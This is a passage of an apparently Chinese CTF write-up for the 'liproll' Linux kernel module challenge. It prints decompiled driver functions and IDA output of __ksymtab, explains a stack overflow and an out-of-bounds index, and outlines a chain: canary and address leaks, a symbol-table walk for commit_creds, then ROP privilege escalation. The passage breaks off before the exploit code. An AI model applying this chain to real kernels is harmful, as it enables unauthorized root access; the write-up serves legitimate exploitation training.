class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">create_a_spell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"> </span><br><span class="line">  v0 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="keyword">int</span>)v0;</span><br><span class="line">    <span class="keyword">if</span> ( !lists[v0] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v0 == <span class="number">0x10</span> )</span><br><span class="line">      <span class="keyword">return</span> printk(<span class="string">"[-] Full!\n"</span>);</span><br><span class="line">  &#125; </span><br><span class="line">  result = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">8</span>], <span class="number">0xCC0</span>LL, <span class="number">0x100</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> create_a_spell_cold();</span><br><span class="line">  lists[v1] = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单地通过kmalloc申请一个0x100的chunk，存在<code>list</code>数组里（这里<code>kmem_cache_alloc_trace(kmalloc_caches[8], 0xCC0LL, 0x100LL);</code>个人认为可能是被优化了，行为上应该等价于<code>kmalloc(0x100)</code>，不过不是很重要。</p></li><li><p>choose：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">fastcall <span class="title">choose_a_spell</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">    </span><br><span class="line">  v1 = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1 &gt; <span class="number">0xFF</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)choose_a_spell_cold();</span><br><span class="line">  result = (<span class="keyword">void</span> *)lists[v1];</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)choose_a_spell_cold();</span><br><span class="line">  global_buffer = result;</span><br><span class="line">  *((_DWORD *)&amp;global_buffer + <span class="number">2</span>) = <span class="number">0x100</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把<code>list</code>数组中，给定下标中存在的指针赋值给<code>global_buffer</code>，并且把<code>*((_DWORD *)&amp;global_buffer + 2)</code>（其实就是size）设置为0x100。</p><p>显然这里下标是来源于用户程序可控的，且判断只需要小于0x100，<code>list</code> 本身容量就是0x10，显然存在溢出。</p></li><li><p>reset：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">global_buffer = <span class="number">0L</span>L;</span><br><span class="line">*(&amp;global_buffer + <span class="number">1</span>) = <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure><p>清空<code>global_buffer</code>并且设置<code>size = 0</code>。</p></li><li><p>cast：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">cast_a_spell</span><span class="params">(__int64 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  _BYTE v5[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [rsp+100h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+110h] [rbp-10h]</span></span><br><span class="line">    </span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !global_buffer )</span><br><span class="line">    <span class="keyword">return</span> cast_a_spell_cold();</span><br><span class="line">  v6 = global_buffer;</span><br><span class="line">  v1 = *((_DWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">  v2 = <span class="number">0x100</span>;</span><br><span class="line">  v3 = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x100</span> )</span><br><span class="line">    v2 = *((_DWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( !copy_from_user(v5, v3, v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(global_buffer, v5, *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)a1 + <span class="number">2</span>));</span><br><span class="line">    global_buffer = v6;</span><br><span class="line">    </span><br><span class="line">    *((_DWORD *)&amp;global_buffer + <span class="number">2</span>) = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>*((_DWORD *)a1 + 2);</code>是来自于用户程序的，且<code>copy_from_user</code>的size参数正好来自于<code>*((_DWORD *)a1 + 2);</code>，而没有检查，所以存在stack overflow。</p><p>这样，<code>v6</code>和<code>v7</code>的值都可以被覆盖，也就是说<code>glabal_buffer</code>和<code>size</code>都是完全可控的。</p></li></ul></li><li><p>read：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">liproll_read</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD v5[<span class="number">35</span>]; <span class="comment">// [rsp+0h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">32</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( global_buffer )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)global_buffer &gt;= vmlinux_base + <span class="number">0x12EE908</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> __int64)global_buffer &lt; vmlinux_base + <span class="number">0x13419A0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> liproll_read_cold();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(v5, global_buffer, *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;global_buffer + <span class="number">2</span>));</span><br><span class="line">    <span class="keyword">if</span> ( !copy_to_user(a2, v5, a3) )</span><br><span class="line">      <span class="keyword">return</span> a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以注意到这里的<code>memcpy</code>，在<code>*((unsigned int *)&amp;global_buffer + 2)</code>可控的情况下，同样存在溢出；也可以通过设置<code>size = 0</code>，或者放大<code>a3</code>参数的值，leak出栈上的数据。</p></li><li><p>write：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">liproll_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  _QWORD v7[<span class="number">35</span>]; <span class="comment">// [rsp+0h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v7[<span class="number">32</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !global_buffer )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  v3 = <span class="number">256L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x100</span> )</span><br><span class="line">    v3 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(v7, a2, v3) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  v4 = global_buffer;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 &lt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (v3 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)global_buffer = v7[<span class="number">0</span>];</span><br><span class="line">      *(_DWORD *)&amp;v4[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 - <span class="number">4</span>] = *(_DWORD *)((<span class="keyword">char</span> *)v7 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 - <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)global_buffer = v7[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">if</span> ( (v3 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_WORD *)&amp;v4[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 - <span class="number">2</span>] = *(_WORD *)((<span class="keyword">char</span> *)v7 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="keyword">char</span> *)(((<span class="keyword">unsigned</span> __int64)global_buffer + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL);</span><br><span class="line">    *(_QWORD *)global_buffer = v7[<span class="number">0</span>];</span><br><span class="line">    *(_QWORD *)&amp;v4[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 - <span class="number">8</span>] = *(_QWORD *)((<span class="keyword">char</span> *)&amp;v7[<span class="number">-1</span>] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3);</span><br><span class="line">    qmemcpy(v5, (<span class="keyword">char</span> *)v7 - (v4 - v5), <span class="number">8L</span>L * ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v3 + (_DWORD)v4 - (_DWORD)v5) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数就是向<code>global_buffer</code>里写入数据。</p></li></ul></li><li><p>其次调试的过程中发现，这里的<code>kaslr</code>和用户态程序的<code>aslr</code>不太一样，不论是liproll模块的相关的函数地址，还是kernel的一些内核函数，都不是简单的相对于base address有一个固定的偏移，而近乎是完全随机的感觉；比如对于liproll模块：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/module/liproll/sections/.</span><br><span class="line">../                            .text.cast_a_spell</span><br><span class="line">./                             .text.check_bound</span><br><span class="line">.bss                           .text.choose_a_spell</span><br><span class="line">.data                          .text.create_a_spell</span><br><span class="line">.exit.text                     .text.liproll_open</span><br><span class="line">.gnu.linkonce.this_module      .text.liproll_read</span><br><span class="line">.init.text                     .text.liproll_release</span><br><span class="line">.note.Linux                    .text.liproll_unlocked_ioctl</span><br><span class="line">.note.gnu.build-id             .text.liproll_write</span><br><span class="line">.orc_unwind                    .text.reset_the_spell</span><br><span class="line">.orc_unwind_ip                 .text.unlikely.cast_a_spell</span><br><span class="line">.rodata.str1.1                 .text.unlikely.choose_a_spell</span><br><span class="line">.rodata.str1.8                 .text.unlikely.create_a_spell</span><br><span class="line">.strtab                        .text.unlikely.liproll_read</span><br><span class="line">.symtab</span><br></pre></td></tr></table></figure><p>每个函数都有独立的section，而这些section实际加载的地址都是不可预测的（当然section和section之间的相对偏移可能是有一定的预测性的，比如.bss和.data section相差0x4c0就是固定的，后面利用会用到这点）。</p><p>同样的，从bzImage中提取出vmlinux分析，也可以发现，存在着类似的.text.func_name的section，使得<code>prepare_kernel_cred</code>和<code>commit_creds</code>偏移不是相对vmlinux_base固定；但是像<code>liproll_open</code>中通过<code>copy_page</code>函数地址算出vmlinux_base的时候，减去固定偏移，可以看出<code>copy_page</code>的偏移是固定的，同时vmlinux文件中不存在<code>.text.copy_page</code>的section。</p></li><li><p>其次，在<code>liproll_read</code>这里，有一个check，即：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)global_buffer &gt;= vmlinux_base + <span class="number">0x12EE908</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> __int64)global_buffer &lt; vmlinux_base + <span class="number">0x13419A0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> liproll_read_cold();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么<code>vmlinux_base + 0x12EE908 ~ vmlinux_base + 0x13419A0</code>这部分内存就显得很可疑，调试中发现，这部分内存正好是<code>__ksymtab</code>，<code>__ksmtab_gpl</code>和<code>ksymtab_strings</code>这三个section。</p><p>重点在于，<code>__ksymtab</code>这个section，相当于一个<code>size=0xC</code>的结构体的数组，前4 bytes表示函数地址的偏移，中间4 bytes表示函数名的偏移，最后4 bytes也是偏移：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__ksymtab:FFFFFFFF822EE908 __ksymtab       segment dword public &#39;CONST&#39; use64</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 assume cs:__ksymtab</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 ;org 0FFFFFFFF822EE908h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908 ; struct func_struct _ksymtab_array[5944]</span><br><span class="line">__ksymtab:FFFFFFFF822EE908 __ksymtab_array dd 0FF15CB08h, 207DFh, 314F1h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                                         ; DATA XREF: sub_FFFFFFFF81505000+11C↑o</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                                         ; sub_FFFFFFFF81505000+123↑o ...</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF331E4Ch, 29490h, 314E5h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4EC780h, 30040h, 314D9h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4ED4F4h, 30079h, 314CDh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4ED4C8h, 300A8h, 314C1h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4EBE5Ch, 2FFECh, 314B5h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4EE630h, 30038h, 314A9h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4EC284h, 2FFE8h, 3149Dh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4EEDA8h, 3005Ah, 31491h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4EBDFCh, 30000h, 31485h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF377750h, 2A291h, 31479h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF2A8794h, 26BC4h, 3146Dh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF2A7538h, 26BB1h, 31461h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF2A751Ch, 26B94h, 31455h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF982850h, 48936h, 31449h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF5000A4h, 30CC7h, 3143Dh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4D9CF8h, 2F487h, 31431h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4C3EDCh, 2E471h, 31425h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF2CF4C0h, 270CDh, 31419h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF97BA04h, 48682h, 3140Dh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF32DE88h, 2912Bh, 31401h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4AA3DCh, 2D565h, 313F5h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF520h, 2E8E4h, 313E9h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF5E4h, 2E8FEh, 313DDh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF7E8h, 2E954h, 313D1h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF4CCh, 2E878h, 313C5h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF450h, 2E85Dh, 313B9h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF664h, 2E8EFh, 313ADh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF548h, 2E8A9h, 313A1h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF60Ch, 2E8C6h, 31395h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF720h, 2E8FFh, 31389h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CFB94h, 2E859h, 3137Dh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CFA78h, 2E838h, 31371h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF68Ch, 2E8BBh, 31365h</span><br></pre></td></tr></table></figure><p>比如第一项<code>dd 0FF331E4Ch, 29490h, 314E5h</code>，计算出<code>(0x822EE908 + 0xFF15CB08C) &amp; ((1 &lt;&lt; 32) - 1) | (0xFFFFFFFF &lt;&lt; 32) = 0xffffffff8144b410</code>；以及<code>(0x822EE90C + 0x207DF) &amp; ((1 &lt;&lt; 32) - 1) | (0xFFFFFFFF &lt;&lt; 32) = 0xffffffff8230f0eb</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text.IO_APIC_get_PCI_irq_vector:FFFFFFFF8144B410 ; FUNCTION CHUNK AT </span><br><span class="line"></span><br><span class="line">__ksymtab_strings:FFFFFFFF8230F0EB aIoApicGetPciIr db &#39;IO_APIC_get_PCI_irq_vector&#39;,0</span><br></pre></td></tr></table></figure><p>说明这就是个符号表，如果能够便利符号表查找<code>prepare_kernel_cred</code>和<code>commit_creds</code>的地址，那么问题就简单了。</p></li><li><p>那么整个利用思路为：</p><ul><li><p>首先利用<code>liproll_read</code>把canary给leak出来</p></li><li><p>然后利用<code>cast_a_spell</code>功能存在的溢出，把<code>global_buffer</code>覆盖为任意非0值，以及<code>*((_DWORD *)&amp;global_buffer + 2)</code>覆盖为0。</p></li><li><p>之后调用<code>liproll_read</code>的时候，由于<code>memcpy(v5, global_buffer, *((unsigned int *)&amp;global_buffer + 2));</code>参数中<code>size = 0</code>，所以相当于没有执行，就能把栈上的残留数据leak出来；调试过程中发现leak出来的数据中，通过偏移为0x18的数据，可以得到liproll模块.data section的起始地址，即<code>uint64_t _data_sec = ((*(uint64_t *)(buf + 0x18) &gt;&gt; 12) &lt;&lt; 12) + 0x2000;</code>，其次.bss section和.data section的偏移固定，为0x4c0，同样可以计算出.bss section的起始地址：<code>uint64_t _bss_sec = _data_sec + 0x4C0;</code>。</p></li><li><p>那么获得了.bss section的地址后，就能继续利用<code>cast_a_spell</code>存在的栈溢出，把<code>global_buffer</code>指向.bss上vmlinux_base的位置，这样就把vmlinux加载基址给leak出来了；于此同时，可以通过<code>liproll_write</code>将其覆盖为0，绕过之后调用<code>liproll_read</code>中的check：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)global_buffer &gt;= vmlinux_base + <span class="number">0x12EE908</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> __int64)global_buffer &lt; vmlinux_base + <span class="number">0x13419A0</span> )</span><br></pre></td></tr></table></figure></li><li><p>通过不断地利用<code>cast_a_spell</code>中的栈溢出修改<code>global_buffer</code>，遍历<code>__ksymtab</code>，找到<code>prepare_kernel_cred</code>和<code>commit_creds</code>的地址。</p></li><li><p>最后只要构造rop提权即可，因为并没有开启smep保护，所以gadget可以在用户态程序中构造。</p></li></ul></li><li><p>exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span 